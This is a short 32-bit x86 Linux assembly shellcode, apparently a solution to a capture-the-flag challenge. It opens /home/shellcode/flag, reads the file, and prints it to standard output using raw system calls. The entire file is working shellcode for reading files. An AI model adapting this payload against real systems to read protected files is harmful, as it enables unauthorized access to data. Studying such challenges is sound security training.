section .text
	global _start

_start:
	xor ecx, ecx 	; clear ecx
	mul ecx		; clear eax, edx

	mov al, 5	; open /home/shellcode/flag
	push 0x00000067
	push 0x616c662f ; galf
	push 0x65646f63 ; /edo
	push 0x6c6c6568 ; clle
	push 0x732f656d ; hs/e
	push 0x6f682f2f ; moh/
	mov ebx, esp
	int 80h

	xchg ebx, eax	; read the file opened
	xchg eax, ecx
	mov al, 3
	mov ecx, esp
	mov edx, 0x0FFF
	inc edx
	int 80h

	xchg eax, edx	; write the text read to stdout
	mov bl, 1
	shr eax, 0x0a
	int 80h

	mov al, 1	; exit
	mov bl, 0
	int 80h

